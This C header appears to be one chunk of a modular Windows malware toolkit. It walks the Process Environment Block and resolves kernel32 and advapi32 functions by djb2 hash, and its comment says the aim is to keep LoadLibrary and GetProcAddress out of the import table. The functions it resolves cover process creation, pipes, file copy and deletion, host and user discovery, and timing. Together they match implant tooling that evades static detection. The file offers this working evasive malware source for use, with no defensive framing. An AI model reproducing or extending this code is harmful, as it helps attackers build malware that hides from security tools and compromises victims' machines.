// chunk: api_resolve/peb_walk
// depends: (none)
// provides: peb_get_module, peb_get_proc, peb_resolve_apis
// headers: windows.h,winternl.h
// note: Pure PEB walking — no LoadLibrary/GetProcAddress in IAT at all

#ifndef CHUNK_PEB_WALK
#define CHUNK_PEB_WALK

#include <windows.h>
#include <winternl.h>

static DWORD peb_djb2(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

static DWORD peb_djb2_w(const WCHAR *s) {
    DWORD h = 5381;
    while (*s) {
        char c = (char)(*s > 127 ? '?' : *s);
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
        s++;
    }
    return h;
}

static HMODULE peb_get_module(DWORD name_hash) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur = head->Flink;

    while (cur != head) {
        LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            WCHAR *name = entry->FullDllName.Buffer;
            WCHAR *slash = name;
            for (WCHAR *p = name; *p; p++)
                if (*p == '\\' || *p == '/') slash = p + 1;
            if (peb_djb2_w(slash) == name_hash)
                return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

static FARPROC peb_get_proc(HMODULE mod, DWORD func_hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *fn_name = (char *)(base + names[i]);
        if (peb_djb2(fn_name) == func_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);

static struct {
    fn_CreateFileA      pCreateFileA;
    fn_ReadFile         pReadFile;
    fn_CloseHandle      pCloseHandle;
    fn_CreateProcessA   pCreateProcessA;
    fn_CopyFileA        pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA      pDeleteFileA;
    fn_CreatePipe       pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize      pGetFileSize;
    fn_GetTempPathA     pGetTempPathA;
    fn_GetComputerNameA pGetComputerNameA;
    fn_GetUserNameA     pGetUserNameA;
    fn_Sleep            pSleep;
    fn_GetTickCount     pGetTickCount;
} peb_api = {0};

static int peb_resolve_apis(void) {
    HMODULE k32 = peb_get_module(0x7040ee75);
    HMODULE adv = peb_get_module(0x67208a49);
    if (!k32) return 0;

    peb_api.pCreateFileA      = (fn_CreateFileA)peb_get_proc(k32, 0xeb96c5fa);
    peb_api.pReadFile         = (fn_ReadFile)peb_get_proc(k32, 0x71019921);
    peb_api.pCloseHandle      = (fn_CloseHandle)peb_get_proc(k32, 0x3870ca07);
    peb_api.pCreateProcessA   = (fn_CreateProcessA)peb_get_proc(k32, 0xaeb52e19);
    peb_api.pCopyFileA        = (fn_CopyFileA)peb_get_proc(k32, 0xac2253c1);
    peb_api.pGetFileAttributesA = (fn_GetFileAttributesA)peb_get_proc(k32, 0xcc9c6ccd);
    peb_api.pDeleteFileA      = (fn_DeleteFileA)peb_get_proc(k32, 0x1cd88719);
    peb_api.pCreatePipe       = (fn_CreatePipe)peb_get_proc(k32, 0x9a8deee7);
    peb_api.pWaitForSingleObject = (fn_WaitForSingleObject)peb_get_proc(k32, 0xeccda1ba);
    peb_api.pGetFileSize      = (fn_GetFileSize)peb_get_proc(k32, 0x7891c520);
    peb_api.pGetTempPathA     = (fn_GetTempPathA)peb_get_proc(k32, 0x9ef979e9);
    peb_api.pGetComputerNameA = (fn_GetComputerNameA)peb_get_proc(k32, 0xaa63bfb6);
    peb_api.pGetTickCount     = (fn_GetTickCount)peb_get_proc(k32, 0x41ad16b9);
    peb_api.pSleep            = (fn_Sleep)peb_get_proc(k32, 0x0e19e5fe);

    if (adv)
        peb_api.pGetUserNameA = (fn_GetUserNameA)peb_get_proc(adv, 0x9bc3ab46);

    return peb_api.pCreateFileA != NULL;
}

#endif
